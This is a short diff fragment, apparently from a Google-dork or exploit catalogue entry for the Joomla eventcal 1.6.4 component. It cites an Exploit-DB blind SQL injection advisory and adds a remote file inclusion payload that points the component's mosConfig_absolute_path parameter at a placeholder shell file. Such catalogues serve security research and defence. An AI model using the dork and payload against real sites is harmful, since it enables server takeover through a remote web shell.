@@ -8,3 +8,4 @@ Description:      inurl:"com_eventcal"
 
 
 Joomla eventcal Component 1.6.4 com_eventcal Blind SQL Injection Vulnerability: https://www.exploit-db.com/exploits/14187
+Author : AtT4CKxT3rR0r1ST [F.Hack@w.cn] RFI: www.site.com/components/com_eventcal/eventcal.php?mosConfig_absolute_path=[shell.txt?]
